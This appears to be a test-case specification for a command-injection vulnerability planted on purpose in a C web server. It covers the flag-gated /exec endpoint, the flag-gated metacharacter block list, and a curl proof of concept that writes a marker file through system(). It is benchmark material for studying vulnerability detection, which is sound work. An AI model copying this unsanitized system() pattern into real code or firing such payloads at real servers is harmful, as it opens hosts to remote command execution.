DESCRIPTION:
  CLI-flag-gated command injection with a flag-gated sanitization check.
  The server must be started with --exec-mode for the /exec endpoint to
  execute commands. A --safe-mode flag enables shell metacharacter checking,
  but omitting --safe-mode bypasses sanitization entirely. The cmd query
  parameter flows directly into system() with no intermediate copies.

CONFIG_GATE (C1 — simple):
  mechanism:  CLI flag (--exec-mode), stored in global int exec_mode
  check:      single boolean guard at top of callback_exec():
              `if (!exec_mode)`
  complexity: one condition, one global flag, no struct, no utility function

INPUT_FLOW (I1 — direct):
  entry:      HTTP GET /exec?cmd=<payload>
  path:       callback_exec() reads cmd from request->map_url
              cmd pointer passed directly to system()
  transforms: none — no snprintf, no copy, no urldecode step

SANITIZATION (S3 — flag-gated check):
  mechanism:  --safe-mode CLI flag enables has_shell_meta() check
  bypass:     omit --safe-mode flag — check is never called
  check:      `if (safe_mode && has_shell_meta(cmd))` — returns 400 if
              cmd contains any of: |;&`$<>(){}
  note:       even with --safe-mode, safe only blocks listed chars;
              other injection vectors (newlines, spaces) remain

SINK:        system() in callback_exec() (server.c)

CHANGED FILES:
  server.c — additions after callback_default():
    1. exec_mode global:  `static int exec_mode = 0;` (C1)
    2. safe_mode global:  `static int safe_mode = 0;` (S3)
    3. has_shell_meta():  checks for shell metacharacters (S3)
    4. callback_exec():   C1 gate + S3 check + I1 direct system() call
    5. main():            --exec-mode and --safe-mode flag parsing

EXPLOIT:
  build:   bash build.sh
  start:   ./ulfius_server --port 18100 --exec-mode
           (omit --safe-mode to bypass S3 sanitization)
  trigger: curl 'http://127.0.0.1:18100/exec?cmd=id>/tmp/poc_100_marker'
  verify:  cat /tmp/poc_100_marker
  expect:  uid=... line written by the server process

  gate bypass (C1): omitting --exec-mode causes /exec to return 403.
  sani bypass (S3): omitting --safe-mode disables metacharacter check;
                    payload with > or ; or | passes through to system().

NOTES:
  - system() output goes to the server's stdout/stderr, not the HTTP response.
    The response body contains only "Command dispatched".
    Use a write-to-file payload (id>/tmp/marker) to confirm blind execution.
  - With --safe-mode active, the payload id>/tmp/marker would be blocked (400)
    because > is in the blocked metacharacter set.
